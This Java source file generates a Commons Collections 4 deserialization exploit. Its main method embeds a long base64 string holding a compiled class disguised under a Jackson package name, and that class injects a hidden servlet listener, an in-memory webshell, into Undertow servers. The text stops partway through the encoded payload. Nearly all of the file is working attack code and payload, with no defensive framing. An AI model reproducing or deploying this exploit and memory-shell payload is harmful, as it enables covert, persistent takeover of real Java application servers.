package org.tools.ser;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.tools.ClassFiles;
import org.tools.Reflections;
import org.tools.encryption.B64;

import javax.xml.transform.Templates;
import java.io.Serializable;
import java.util.PriorityQueue;

/**
 * @author Whoopsunix
 */
public class CC4Generator {
    public static void main(String[] args) throws Exception{
        B64 b64 = new B64();
//        String base64Str = b64.encodeObj(cc4Demo(b64.encodeJavaClass(Calc.class)));
        String b64Str = "yv66vgAAADEBagEAIGNvbS9mYXN0ZXJ4bWwvamFja3Nvbi9hbC9DU1ZVdGlsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEADGdldENsYXNzTmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEQ29kZQEAKGNvbS5nb29nbGUuZ3NvLldoaXRlQmxhY2tMaXN0R3l0TGlzdGVuZXIIAAgBAA9nZXRCYXNlNjRTdHJpbmcBAApFeGNlcHRpb25zAQATamF2YS9pby9JT0V4Y2VwdGlvbgcADAEAEGphdmEvbGFuZy9TdHJpbmcHAA4BEgRINHNJQUFBQUFBQUEvNDFZQ1h3VDE1bi9mNWJza1dWQndBb0doM0FFQ01pbk1NRWNCdEpnWTRNVFd5R1lvNFpOazdFOGxnV3k1RWdqZzVPbVNVcWFkbmV6YmRJamFkcW0zVzJhVW5vdENZMk13NWF5dmEvZGRyZnRkbnZmOTVrZTZVbmQvM3N6RnBZdEIzN0F6T2k5Ny94L3gvc2VuLzdicytjQU5FbE1FSXFtaHNLeFZDcVdzTUt4VENwOFlEQnVXNjBKTTNxa0s1NnhkNDdhNm1VbHJiUUJFU3c0Ykk2WTRZU1pqSVhiRW1ZbTA1VXkrOVdXUjdCS2JSMExaNnowU01LeXd6M09lNDkxUjliS1RCRlNLaWpiR2svRzdlc0ZubEROZm9HM0xkVnZDYTdvaWlldFNIYW96MHJ2TmZzU1hLbnNTa1hOeEg0ekhWZS8zVVd2UFJqUENHcTdMdGZ1TFFFWThQbmh4VnpCVmFHdW9oNXNVWWJJbllLRnMrd3JJZk9Va0NCcExwTDAyT2w0TXRhYWpTYzBEQXY4cUZKcXZNUGtWQTVNcDZTY1JhZ3VSd211SWc3bThMQ1Y3QmMwaEdZUzFzeFljclZReE5WWW9oUXRKWUpIck5FQWxqc2lyeEg0N0pSRExMZ3lORk1FZVZkaWxlSzlscnhEL2MyQzFaZWxtNHhyRVBKVFNZMzYwdXJxQktYNzluWTBiUEtoUVZBU3pRUVFkbmJXRXN0Ym1DeWhRNjAxMC9IY29rajcrRGpVS3Fqb3R3WVlkYjFCWEVuZjJUbVRJNEFOMktpdzMwUzV4d1FHNlE3V0tQN2dSZEwyWTFGcjJJNm5rZ2Eya2l4SzlWMU9Sa2JUbzhOMkt0d1dIeDRrZWd6T2lKbGVQN2s5alpuYlFrdGtpUDhPR21oMlZVd1RZcUJETUtmSFpySjFtOE51WW5xMnQvZjQwRW1uWXBiZG1jellaakxLNVpwWjhaMXVXUUEzb2N1UG5lZ1dMQ3NneUF4YlVSWlVORzNaTjFtalBmeGw0R2JCdk9tQ0RSQjFIOVczanRvVzNmQ0dpRklBUGRqcnh4N3NjeEF1WXM1K2xkMEgvTmlORjVOSkZhY2k3WFFvTTFZMG00N2JvMkdxMXFRSGNVaForUThNUkgrcUk1NDBFMHhsRldxbDZ5VzRUVzNlVHV2U1R1bnY0TDkwYXRUcXorZmFiRTJpZmNSSzJyb1NnNW1aRzRLVmw4SE5vblAxZHRLTnVKbUkzNmswbDVucDlNMVp5bGptT0JWUGhSVkcyOU5wYzVUcncxbWJXRmpta0lyL1FHSGgzdHgzMklvcXdiNjBsUmxPSlRNTTZuUS9CbTE3T0x5TGo3eEpEaVc1akl5VnlUQ3pCTXRuWjlJVUtqWDdUZHNrait1Q1lNMGxGV2xDc2w1elNXd01wQVhYWHBZOEE5Uzkrdko4TkRBaVdQckNyaGxnMmM1blloYXFJU2FobWhjTUtvdmlUdHpsUndZdkZmZ0hMZFdMSSthUUZjRExuRlp6ajZDY2NuZnBuUUR1UTZnQ1dieWNWZWdRN3pjVFdWTGY3MUMvZ2xHTXBwSzJHVSt5UEJZWEhBYURacnBIS1dYVmJxazVHTUFyOFNwVk5mOG9xSXBkOUxZam5ScktXMy9McGZQQThXSzZrN1BtU3dEL2pBZFZtLzBYdXF2eGNwTm54UXlnWnFSUEFLL0JROHI3aHdVQjh1NDIwMFRLVnJDOHpvSGw5ZHpvTXpQV2h2VTdyS2crZEt1S2RTZFZ4NC9nVVdYR0d3Tm93UmIxOVNhbTViQTVtdUJ4Nk1OYkhBM2JiWEwwWlczcjBzZUlXMFVCdkJWdnE4QW8vcldnZlRtN0J0N3V0Qy8zUEFpR2lwMEY3OENUZmp5QmQzSmltTFpwNEYyQ3VaUDh6c0V0cUo0cEpYK212eHZ2OGVNazNxc2NEQWF3RHRlcHIzK25kNWtDNzlZVThXNm1jNm81UG9XbmxYdW5HYjdoU2Z3elBqeWo0T2Zpa2hmc1BnYk8rREd1Qm9pS3BIWDA0aGxTZUpUbm9UeUwvMURXZjVEdGpYbG1KakxxeUMxaUZwUDVReml2UVB0UHAxb09zSjhyYUJaT3lxVkJ1K21VdTBIUkg4RkhLM0FVSHlOOUp0dVhjVWVLcWxEaDhaeWZEVDZCVDZwYStkVGtpVndvejhCbk9Db2NWZC9UTEp4eUFQMFgvdHVQeitKenlrd09KeFYyS2c5UkFQK3JUckJ4ZkNHZnYrM0p5Znd0SERIeUZuMEovNmRDK1dXbGNEYWJ2NkpzL2lwMURTU3ltY0hXN01DQXFwV3Z3NmRjL3dZam1COExpS3pQT2hZZHBBRExoMi9URzZMWXdZTnFVeEc4TDdNUXZvdnZLUXUvVC8ybXpWRmljSWc5bXFueVE0NFdtanhyeHhOaHpoY0dmc3dJYzlEcnNkaHo1ay9HVEc5emlhSitpcDlWNENmNGVRRW50d3o4a2xWcnB6U0tDb21hUThVcytUV2VxOEN2OEJ2T01ER2xZbld4SkNyRytEdjhYdWw5bnFJTEcxNGJlNngxelBiaGo2elNUR0dQOCtIUDdubmhTSXVrZXJMUndZNjRsZWlmTXNQOTFablRtaWVQemRscDNZbHVyZk5xY2w3cldQZFQrTkxXUUlJbWh6V255M0Fkc1N3eW5DNmNoY3VRTXJZczRzUFdtVERUVnI5ZXZmVHNYcWc2SUQ0cFo5R0tuN0ZTL1QwN2JLV2pTblZBQXFxeG5aUTVhaGhqTFZ5UUswaWorbEEwcWpxOGMvc0pIV1N4eUh5cDlJc2hRVDRVK2t1bVRXcmRwRGRqMW81NHpKa05QR2tWVmsvM2ptYWZMT0s1OXdMVWh2QmkwalM3VDdQbzRPd3FWL3Rsc1N4aHFpYXNaTXdlMU5lN3pvQXNrK1dzTStIbHBDdzd6UG5HY2daNGRoSTZzbEpXS1M0Vy9KVmEvSkJwRDRaYjQ3Rk81aytNblVQV2tLMWY2d2hJRGJzQWlXdlZ1Tm5KdWxkanE5VDdKU1FONmw3ekZmVVYxcTFqSHk5VzZUWjJpb0EwcWZ2T0htRkNHRTdUWU44cmM1cUlrd2NiZUJmcFk0R1hqcWhSd1QyV0dsVUpOYlpxTXA5c0p2TkFTZzhlbktBdUVYRDNuSkl0c2xXRmM1dHprTHU2ZmZJaVRwZUhacEFic3QxcHpkMldQWmhpV3QxUVJNdE10bUtKNWtpZ0FXMnlReG5RenFaY3BPd04yU2xZTkJ1N0lieklsTVdUSTZramRIbHprWVpRUkdTeEhpRTNTWmRmYmhUZWFlWmFHb085N2czVko3ekNWR1d5eWNhaGVDYmEyTHE5cDMyeXJ4T21XOVNocG4vNHBFZmROQ3czZG42bkJCMnEvU283TElmcXhUT2w1ZWtPOHVCdzZKd3U3eFBlWG54Ym93bjNQeUlxT21PcEk3R1JSUFNPNUdHZjNNWWtzTmIxRDJ3MHI0dXU3VjlycnUxYnU4RW5uTXY5KzlqTEdyYkgyS2g5Nm9aWjNta1A4dHc5WmtaOVl1RWFkbk12YUJILytOUWxHVUM1dWhMejdWUFhmdjFlcnQraTVsZjl2bCsvQS93eXVFdVovTFdka29UdllPMFlycWdOU3Y4enVKZXZnV2Z3d0ZOY0xvR2ZUM1Y0QUV0UmlXV29jRVdRaGU4NVdyQ0JlYTY0TENrVmJYTnQzUml1TEpSM0ZsVzlZMWo0TkJibnNPeHByT0F6aDlWblVIc2E5WldOcDlGMFVXRWx2UU5XVU1WS2VyVUs2M0d0Vmx6bENIY1ZxNi81cE9WRlNzMVRyZ25ieUt1b3ltdnJQSFhueHJENVZGNXNtYlk3TkVWVWVWNVVPWlUwYTFHY1FsMVJYeWFITXFTdThzWXppRVFhcm40TWh2Y0V2S1Zuc2J0WGU3Qy84c1l4OU9ad2EwTmREdWFwaUp6U0t0WlF5VFo0dE5JcWxQTFpRRkdOOUNqTW5iV29RWk0yWWozM3lyaDZQVjVFNmhxYWRBTWo0bEVxODRiVm9WVWJwcjdhc0lNMHUvaTlGWjRKWEFHdmdSSUQ3ZXpOTzZFZUU5eWF1c2FQblRLQmhmQzRpNHBxRzZYMUllbzYyYXpoWVJpZm1vYlRoaWs0U2Q0Y1FUOHNqZFBBcEFqNUVkM3djZTk1Z25EM2VXUzc2MnMvZ0h2SGNid0VIOGUzTHY3Z3h3TTUvTk5qK0V4dC9SaGVIYWtmeDJ1SnQ3ZWVPVEdPTjVUZ0RCNXJLYTJ0THZYazhPYVcwbXB2NWVQaitMY1N6azhyMVBkWmxQVFc1bkFpaC9lTjRmM1ZwVG1jR3NjSFBEaUJ1K29yYzlXbDR4anpjRklkWjVZOTIxS1c1ejZQa3ptY2F6R3FqZXF5SEQ1OG9OcW9WNitHY1h4YzhEVHFQZlBtNWZEcEhENWZiZVR3UCs1NnJhTDlvcGQybk1IL2N5OVByWWkvNWl4OFU2amFHM21LS1Bqd0hFZVV5WkR2eHdJK04zTjFDNE82bFVIZmhvME1janZESEdHSUR6TElvd3ptY1lielFhNCtqZzQ4eWJDK0Y1MDRoeHZ4VWR5RXI2SUxQeVAxY3h3Y2Y0ZGI4SHYwNkhqc29kUUhHWUVZQmhtbng3RVhjUnhtQllieFlSeEJnaFpzeExNWVFwS1oyMDZKS1FaWUplRHorUWcrNzBiUWgxOWlHSGU0Q2JVUzNna2FWYWJ6aFBlYnJJR2pCa2FaTThBZmNiUlZwUTFKZVdmazgxc3F6U2hpbTg2Z0ZGY012cVBTWFJmRWQ4N2dCMEg4aU0veitFbUVNUDFDT0UvL1ZzWFpzNkYwQWFONjd1M1lYTzFkVUxxdXBheWh1bXdjZnlnQmdRL2lUem8zRmsydUJmRVhMZVJvOXdtVTMxOHFKeVkrVm45S2UxQ3JKbG9xVmNxL1JJK1ZmNXVrVytWR3BLSHlpU2RSeFhLVUN2TE5hZkUyNUdSdTVNVEVUK3MvZ2NCWlhPaXRHNU41SDZyMzV1VEsrdHFjTEZBRk80ZTZxbkRCamQ0NklnWEdxQVNINk5hdDNMMk4rN2VUd21ScjdjTVM1djF5WnY4cXhxQ0I2SzhqL3BQRnZJai8vb1lKM1RVMnNZZ09hM3MzQ1dkRTZpbkJCaWtSajRhclNieFNTbzBLKy9ud1hvQmhpR0hnWk1UQWhmSkFBY0txbXppMStpNnVlZlIvcDNjRnBmcU1MR1dsc1FsNTZNaUtuS3crSzZGZWIzMU82R0lqODFUVzV1UzZMcVpvZDkwcHJiMk9MV2d5UjVmcWtLblEzVUhSYVhxWDRYNldGRFp6YVVSN3RKeTA1V3hQYmVKMGdTYTJvbXJkSmNLeVVIdTBTNThESlJOa1k5cnM0Vitud1pDTjF5SW5SQkpob3FvUTNhMnNiamtqMTNmWEIrVUdPUyt0T2VtbzUzdFhUdGhkR2IyZzdQWitFQ2Q3UFpYdFBkeHI0SThuZWoyMS9JNmN4eDY2c2lVU2xEMWFnaXBwYjdWWE0rMmR5bFR0bmNGVjJ1SWxBaVc2dmJiUnVoMzBielNQaEJQdk83bDdOODE5R2VON0QrbGVTY3A3U2ZseTF1SngxdC85NUhtQVhLL0FYWGlWUm1jWEVWeUNsYktlVVZZNHRVZ3pJMXBDMm12MW1wZWNqZTdhRG15VURXNXJ2MXMydWszM0x0bVVSN0ZHTmZRMjNhUW5VWndnbWRmOXJiczJIMzhpK2RUY2VBU1B1azE0cjR2eThha29IeWlPY3E4TDJKNlpLTGZ6THlHN25rQWZtZ0gwclZQNXBnSHRNbDdFdW8xZGJSdlBvSmNTejBLc1ZRdDVEWTEraVBnOVRMckhTUGxhVXI2ZS9lNE43R2lQa09lTjVIb1U5K0ZOVTdCZUxmdGNyTGU1dU81RlNLOTV5ZG5rcnUxa0pDYXhQazZzbll5OWoxZzNUOFc2dzgzWWRoZnJUUXByL1hzcTFqNTVTWDVXaXVnaUFCcURjdnRwTEE1SzMybXN1S3lwUnJUemMybFNBRmV4bWhlemNWd04vQjJaZktiOEhSc0FBQT09CAAQAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAASABMKAA8AFAEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HABcBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAhsaXN0ZW5lcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAB2NvbnRleHQBAAhjb250ZXh0cwEAEExqYXZhL3V0aWwvTGlzdDsBAAR0aGlzAQAiTGNvbS9mYXN0ZXJ4bWwvamFja3Nvbi9hbC9DU1ZVdGlsOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBACRMamF2YS91dGlsL0xpc3Q8TGphdmEvbGFuZy9PYmplY3Q7PjsBAA5qYXZhL3V0aWwvTGlzdAcAJAEAEmphdmEvdXRpbC9JdGVyYXRvcgcAJgEADVN0YWNrTWFwVGFibGUMABIAFgoABAApAQAKZ2V0Q29udGV4dAEAEigpTGphdmEvdXRpbC9MaXN0OwwAKwAsCgACAC0BAAhpdGVyYXRvcgEAFigpTGphdmEvdXRpbC9JdGVyYXRvcjsMAC8AMAsAJQAxAQAHaGFzTmV4dAEAAygpWgwAMwA0CwAnADUBAARuZXh0AQAUKClMamF2YS9sYW5nL09iamVjdDsMADcAOAsAJwA5AQALZ2V0TGlzdGVuZXIBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAOwA8CgACAD0BAAthZGRMaXN0ZW5lcgEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgwAPwBACgACAEEBAA5yZXF1ZXN0Q29udGV4dAEADnNlcnZsZXRDb250ZXh0AQABaQEAAUkBAAd0aHJlYWRzAQATW0xqYXZhL2xhbmcvVGhyZWFkOwcASAEAE2phdmEvdXRpbC9BcnJheUxpc3QHAEoKAEsAKQEAEGphdmEvbGFuZy9UaHJlYWQHAE0BAApnZXRUaHJlYWRzCABPAQAMaW52b2tlTWV0aG9kAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsMAFEAUgoAAgBTAQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwAVQBWCgBOAFcBADJpby51bmRlcnRvdy5zZXJ2bGV0LmhhbmRsZXJzLlNlcnZsZXRSZXF1ZXN0Q29udGV4dAgAWQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgcAWwEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAF0AXgoAXABfAQAHY3VycmVudAgAYQEAGGdldEN1cnJlbnRTZXJ2bGV0Q29udGV4dAgAYwEAA2FkZAEAFShMamF2YS9sYW5nL09iamVjdDspWgwAZQBmCwAlAGcBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgcAaQEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HAGsBACtqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uBwBtAQAJU2lnbmF0dXJlAQAmKClMamF2YS91dGlsL0xpc3Q8TGphdmEvbGFuZy9PYmplY3Q7PjsBABNqYXZhL2xhbmcvVGhyb3dhYmxlBwBxAQAJY2xhenpCeXRlAQACW0IBAAtkZWZpbmVDbGFzcwEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAFY2xhenoBABFMamF2YS9sYW5nL0NsYXNzOwEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAtjbGFzc0xvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7DAB9AH4KAE4AfwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAgQCCCgAEAIMBAA9qYXZhL2xhbmcvQ2xhc3MHAIUBAA5nZXRDbGFzc0xvYWRlcgwAhwBWCgCGAIgMAAUABgoAAgCKAQALbmV3SW5zdGFuY2UMAIwAOAoAhgCNDAAKAAYKAAIAjwEADGRlY29kZUJhc2U2NAEAFihMamF2YS9sYW5nL1N0cmluZzspW0IMAJEAkgoAAgCTAQAOZ3ppcERlY29tcHJlc3MBAAYoW0IpW0IMAJUAlgoAAgCXCAB1BwB0AQARamF2YS9sYW5nL0ludGVnZXIHAJsBAARUWVBFDACdAHgJAJwAngEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwAoAChCgCGAKIBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHAKQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwApgCnCgClAKgBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwwAqgCrCgCcAKwBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAK4ArwoApQCwAQARbGlzdGVuZXJJbmZvQ2xhc3MBAAxsaXN0ZW5lckluZm8BAA5kZXBsb3ltZW50SW1wbAEAFGFwcGxpY2F0aW9uTGlzdGVuZXJzAQAUbWFuYWdlZExpc3RlbmVyQ2xhc3MBAA9tYW5hZ2VkTGlzdGVuZXIBAAdnZXROYW1lDAC4AAYKAIYAuQEACmlzSW5qZWN0ZWQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KVoMALsAvAoAAgC9AQAkaW8udW5kZXJ0b3cuc2VydmxldC5hcGkuTGlzdGVuZXJJbmZvCAC/AQAHZm9yTmFtZQwAwQBeCgCGAMIBAA5nZXRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwwAxADFCgCGAMYBAB1qYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcgcAyAEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAjADKCgDJAMsBAApkZXBsb3ltZW50CADNAQAFZ2V0RlYMAM8AUgoAAgDQCAC1AQAoaW8udW5kZXJ0b3cuc2VydmxldC5jb3JlLk1hbmFnZWRMaXN0ZW5lcggA0wEAEWphdmEvbGFuZy9Cb29sZWFuBwDVCQDWAJ4BABYoWilMamF2YS9sYW5nL0Jvb2xlYW47DACqANgKANYA2QgAPwEAXShMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzcztbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAUQDcCgACAN0BAA1ldmlsQ2xhc3NOYW1lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAMYWxsTGlzdGVuZXJzCADhAQAEc2l6ZQEAAygpSQwA4wDkCwAlAOUBAANnZXQBABUoSSlMamF2YS9sYW5nL09iamVjdDsMAOcA6AsAJQDpCACzAQANbGlzdGVuZXJDbGFzcwgA7AEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDADuAO8KAA8A8AEADGRlY29kZXJDbGFzcwEAB2RlY29kZXIBAAdpZ25vcmVkAQAJYmFzZTY0U3RyAQAUTGphdmEvbGFuZy9DbGFzczwqPjsBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyCAD3AQAMZGVjb2RlQnVmZmVyCAD5AQAJZ2V0TWV0aG9kDAD7AKEKAIYA/AEAEGphdmEudXRpbC5CYXNlNjQIAP4BAApnZXREZWNvZGVyCAEAAQAGZGVjb2RlCAECAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24HAQQBAA5jb21wcmVzc2VkRGF0YQEAA291dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAJpbgEAHkxqYXZhL2lvL0J5dGVBcnJheUlucHV0U3RyZWFtOwEABnVuZ3ppcAEAH0xqYXZhL3V0aWwvemlwL0daSVBJbnB1dFN0cmVhbTsBAAZidWZmZXIBAAFuAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HAQ8BABxqYXZhL2lvL0J5dGVBcnJheUlucHV0U3RyZWFtBwERAQAdamF2YS91dGlsL3ppcC9HWklQSW5wdXRTdHJlYW0HARMKARAAKQEABShbQilWDAASARYKARIBFwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgwAEgEZCgEUARoBAARyZWFkAQAFKFtCKUkMARwBHQoBFAEeAQAFd3JpdGUBAAcoW0JJSSlWDAEgASEKARABIgEAC3RvQnl0ZUFycmF5AQAEKClbQgwBJAElCgEQASYBAAVzZXRGVgEAOShMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEABHZhcjABAAR2YXIxAQADdmFsAQAEZ2V0RgEAPyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwBLQEuCgACAS8BABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcBMQEAA3NldAwBMwBACgEyATQBAANvYmoBAAlmaWVsZE5hbWUBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsKATIAqAwA5wA8CgEyATsBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HAT0BACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAUABQQoAhgFCAQANZ2V0U3VwZXJjbGFzcwwBRACCCgCGAUUKAT4AFAEADHRhcmdldE9iamVjdAEACm1ldGhvZE5hbWUBAAdtZXRob2RzAQAbW0xqYXZhL2xh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